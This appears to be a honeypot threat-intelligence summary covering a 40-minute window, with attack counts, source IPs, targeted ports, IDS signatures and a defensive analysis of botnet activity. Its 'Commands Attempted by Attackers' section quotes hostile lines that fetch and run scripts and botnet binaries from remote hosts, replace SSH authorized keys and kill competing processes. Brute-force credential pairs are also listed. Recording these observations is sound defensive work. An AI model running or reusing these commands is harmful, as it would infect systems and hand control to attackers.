# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-03T18:01:22Z
**Timeframe:** 2025-10-03T17:20:01Z to 2025-10-03T18:00:01Z
**Files Analyzed:**
- agg_log_20251003T172001Z.json
- agg_log_20251003T174001Z.json
- agg_log_20251003T180001Z.json

---

### Executive Summary

This report summarizes 12,445 events captured by the honeypot network over a 40-minute period. The majority of attacks were detected by the Cowrie (SSH/Telnet), Suricata (IDS), Dionaea (SMB), and Ciscoasa honeypots. A significant volume of activity targeted SMB (port 445), likely related to opportunistic worm or botnet scanning, with Suricata flagging a large number of events as `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication`. Attackers primarily originated from IP addresses `89.254.211.131` and `82.162.61.241`. Common tactics included brute-force login attempts and the execution of shell commands to download and run malicious scripts, modify SSH authorized keys, and perform system reconnaissance.

---

### Detailed Analysis

**Attacks by Honeypot**
- Cowrie: 3,673
- Suricata: 2,655
- Dionaea: 2,401
- Ciscoasa: 2,098
- Mailoney: 999
- Sentrypeer: 229
- Honeytrap: 140
- Adbhoney: 54
- H0neytr4p: 46
- Tanner: 39
- ElasticPot: 25
- Redishoneypot: 25
- Dicompot: 23
- ConPot: 20
- Honeyaml: 10
- Miniprint: 6
- Ipphoney: 2

**Top Attacking IPs**
- 89.254.211.131: 2,277
- 82.162.61.241: 1,468
- 176.65.141.117: 977
- 51.83.134.64: 394
- 107.175.189.123: 389
- 34.101.240.144: 311
- 103.181.143.216: 295
- 185.156.73.166: 212
- 185.193.240.246: 212
- 103.176.78.193: 153
- 92.63.197.59: 202
- 27.254.152.90: 233
- 173.212.228.191: 188
- 61.12.84.15: 159
- 46.105.87.113: 158

**Top Targeted Ports/Protocols**
- 445 (TCP/UDP): 3,803
- 25 (TCP): 999
- 22 (TCP): 432
- 5060 (UDP/TCP): 229
- 80 (TCP): 81
- 23 (TCP): 77
- 443 (TCP): 68
- 1433 (TCP): 31
- 9200 (TCP): 22
- 6379 (TCP): 20
- 3306 (TCP): 14
- 5555 (TCP): 11

**Most Common CVEs**
- CVE-2002-0013 CVE-2002-0012
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2006-2369
- CVE-2005-4050

**Commands Attempted by Attackers**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `uname -a`
- `whoami`
- `crontab -l`
- `w`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...`

**Signatures Triggered**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- ET CINS Active Threat Intelligence Poor Reputation IP groups
- ET INFO curl User-Agent Outbound
- ET SCAN Potential SSH Scan

**Users / Login Attempts (Username/Password)**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/nPSpP4PBW0
- test/zhbjETuyMffoL8F
- info/test123
- superadmin/admin123
- manish/manish
- user11/user11
- foundry/foundry

**Files Uploaded/Downloaded**
- wget.sh;
- arm.urbotnetisass;
- arm5.urbotnetisass;
- arm6.urbotnetisass;
- arm7.urbotnetisass;
- x86_32.urbotnetisass;
- mips.urbotnetisass;
- mipsel.urbotnetisass;
- w.sh;
- c.sh;

**HTTP User-Agents**
- No HTTP User-Agents were recorded in this period.

**SSH Clients and Servers**
- No specific SSH client or server versions were recorded in this period.

**Top Attacker AS Organizations**
- No AS Organization data was available in the logs for this period.

---

### Key Observations and Anomalies

- **High Volume of SMB Exploitation:** The vast majority of traffic, particularly from IP `82.162.61.241`, triggered Suricata alerts for the DoublePulsar backdoor. This indicates widespread, automated scanning for systems vulnerable to exploits like EternalBlue.
- **Credential Stuffing:** The variety of login attempts across multiple honeypots (especially Cowrie) shows sustained brute-force and dictionary attacks. The username/password combination `345gs5662d34/345gs5662d34` was the most frequently attempted.
- **Automated Script Execution:** Attackers, upon gaining access, consistently attempted to download and execute scripts from remote servers (`94.154.35.154`, `213.209.143.62`). These scripts appear designed to deploy botnet clients (`urbotnetisass`) and secure the compromised machine for the attacker's exclusive use by modifying SSH keys.
- **Lack of Sophistication:** The attacks observed appear to be automated and opportunistic rather than targeted. They rely on common vulnerabilities and weak credentials, which is typical for botnet propagation.